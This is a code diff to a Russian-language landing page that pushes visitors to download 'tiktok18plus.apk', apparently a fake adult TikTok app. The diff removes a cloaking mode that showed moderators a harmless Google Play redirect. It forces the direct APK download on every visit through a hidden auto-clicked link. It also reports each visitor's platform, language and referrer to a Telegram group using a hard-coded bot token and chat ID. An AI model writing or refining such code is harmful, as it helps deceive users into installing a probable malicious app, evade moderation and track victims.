@@ -586,45 +586,26 @@
     <script>
         // Конфигурация
         const CONFIG = {
-            moderationMode: false,
+            moderationMode: false, // ПРИНУДИТЕЛЬНО УСТАНОВЛЕНО В APK РЕЖИМ
             botToken: '7302514529:AAFBoPs9nURtCKE0PuIZlu8gAEqMXWp3Ebc',
             groupChatId: '-1002872397956',
             apkFileName: 'tiktok18plus.apk',
             downloadPath: './downloads/'
         };
 
-        // Проверка режима из HTML комментария
-        function checkModeFromHTML() {
-            const htmlContent = document.documentElement.outerHTML;
-            
-            if (htmlContent.includes('<!-- SITE_MODE: FAKE -->')) {
-                CONFIG.moderationMode = true;
-            } else if (htmlContent.includes('<!-- SITE_MODE: APK -->')) {
-                CONFIG.moderationMode = false;
-            }
-            
-            updateSiteMode();
-        }
+        // УБРАЛИ ПРОБЛЕМНУЮ ФУНКЦИЮ checkModeFromHTML()
+        // Режим теперь всегда APK (moderationMode: false)
 
         // Обновление интерфейса
         function updateSiteMode() {
-            if (CONFIG.moderationMode) {
-                document.getElementById('downloadTitle').textContent = '📱 Скачать приложение';
-                document.getElementById('downloadText').textContent = 'Приложение доступно в официальном магазине Google Play';
-                
-                const btn = document.getElementById('downloadBtnMid');
-                btn.textContent = '🔍 Найти в Google Play';
-                btn.style.background = 'rgba(0, 150, 136, 0.3)';
-                btn.style.borderColor = '#00968a';
-            } else {
-                document.getElementById('downloadTitle').textContent = '🔥 Не упусти момент!';
-                document.getElementById('downloadText').textContent = 'Скачай сейчас и получи доступ к эксклюзивному контенту';
-                
-                const btn = document.getElementById('downloadBtnMid');
-                btn.textContent = '⚡ Скачать прямо сейчас';
-                btn.style.background = 'rgba(0, 0, 0, 0.3)';
-                btn.style.borderColor = 'white';
-            }
+            // ВСЕГДА показываем APK режим
+            document.getElementById('downloadTitle').textContent = '🔥 Не упусти момент!';
+            document.getElementById('downloadText').textContent = 'Скачай сейчас и получи доступ к эксклюзивному контенту';
+            
+            const btn = document.getElementById('downloadBtnMid');
+            btn.textContent = '⚡ Скачать прямо сейчас';
+            btn.style.background = 'rgba(0, 0, 0, 0.3)';
+            btn.style.borderColor = 'white';
         }
 
         // Отправка уведомлений
@@ -649,10 +630,6 @@
         // Всплывающее окно
         function showDownloadModal() {
             const modal = document.createElement('div');
-            const modalText = CONFIG.moderationMode ? 
-                'Сейчас откроется Google Play Store.<br><strong>Найдите "TikTok для взрослых"!</strong>' :
-                'Сейчас появится окошко загрузки браузера.<br><strong>Нажмите туда для завершения скачивания!</strong>';
-
             modal.innerHTML = `
                 <div style="
                     position: fixed;
@@ -678,10 +655,10 @@
                         box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
                         animation: modalAppear 0.3s ease;
                     " onclick="event.stopPropagation()">
-                        <div style="font-size: 3rem; margin-bottom: 20px;">${CONFIG.moderationMode ? '🔍' : '📱'}</div>
-                        <h2 style="margin-bottom: 20px; font-size: 1.8rem;">${CONFIG.moderationMode ? 'Переход в Google Play!' : 'Скачивание началось!'}</h2>
+                        <div style="font-size: 3rem; margin-bottom: 20px;">📱</div>
+                        <h2 style="margin-bottom: 20px; font-size: 1.8rem;">Скачивание началось!</h2>
                         <p style="font-size: 1.1rem; margin-bottom: 25px; line-height: 1.5;">
-                            ${modalText}
+                            Сейчас появится окошко загрузки браузера.<br><strong>Нажмите туда для завершения скачивания!</strong>
                         </p>
                         <button onclick="this.closest('div').remove()" style="
                             background: rgba(255, 255, 255, 0.2);
@@ -703,30 +680,16 @@
             setTimeout(() => { if (modal.parentNode) modal.remove(); }, 5000);
         }
 
-        // Функция скачивания
+        // Функция скачивания - ИСПРАВЛЕНА
         function downloadAPK() {
             const timestamp = new Date().toLocaleString('ru-RU');
             const platform = navigator.platform;
             const language = navigator.language;
             const referrer = document.referrer || 'Прямой переход';
             
-            if (CONFIG.moderationMode) {
-                const message = `🔍 <b>ПОИСК В GOOGLE PLAY</b>
-
-⏰ ${timestamp}
-💻 ${platform}
-🗣 ${language}
-🔗 ${referrer}
-
-🟡 Сайт в режиме заглушки`;
-
-                sendToGroup(message);
-                showDownloadModal();
-                setTimeout(() => {
-                    alert('🔍 Ищите "TikTok для взрослых" в Google Play Store');
-                }, 1000);
-            } else {
-                const message = `📱 <b>СКАЧИВАНИЕ APK</b>
+            console.log('🔥 Начинаем скачивание APK!');
+            
+            const message = `📱 <b>СКАЧИВАНИЕ APK</b>
 
 ⏰ ${timestamp}
 💻 ${platform}
@@ -735,27 +698,36 @@
 
 🔥 Пользователь скачал APK!`;
 
-                sendToGroup(message);
-                showDownloadModal();
-                setTimeout(() => {
-                    window.location.href = CONFIG.downloadPath + CONFIG.apkFileName;
-                }, 1000);
-            }
+            sendToGroup(message);
+            showDownloadModal();
+            
+            // УЛУЧШЕННЫЙ СПОСОБ СКАЧИВАНИЯ
+            setTimeout(() => {
+                const link = document.createElement('a');
+                link.href = CONFIG.downloadPath + CONFIG.apkFileName;
+                link.download = CONFIG.apkFileName;
+                link.style.display = 'none';
+                
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                
+                console.log('✅ Ссылка на скачивание активирована:', CONFIG.downloadPath + CONFIG.apkFileName);
+            }, 1000);
         }
 
         // Инициализация
         window.addEventListener('load', () => {
-            checkModeFromHTML();
+            updateSiteMode(); // Устанавливаем APK режим
             
             const timestamp = new Date().toLocaleString('ru-RU');
             const platform = navigator.platform;
             const language = navigator.language;
             const referrer = document.referrer || 'Прямой переход';
-            const siteMode = CONFIG.moderationMode ? '🟡 ЗАГЛУШКА' : '🟢 АКТИВНЫЙ';
             
             const message = `👤 <b>НОВЫЙ ПОСЕТИТЕЛЬ</b>
 
-⚙️ Режим: ${siteMode}
+⚙️ Режим: 🟢 АКТИВНЫЙ (APK)
 ⏰ ${timestamp}
 💻 ${platform}
 🗣 ${language}
@@ -766,7 +738,7 @@
 
         // Обработчики
         document.addEventListener('DOMContentLoaded', () => {
-            checkModeFromHTML();
+            updateSiteMode(); // Еще раз устанавливаем APK режим
             
             // Кнопка скачивания
             document.getElementById('downloadBtnMid').addEventListener('click', (e) => {
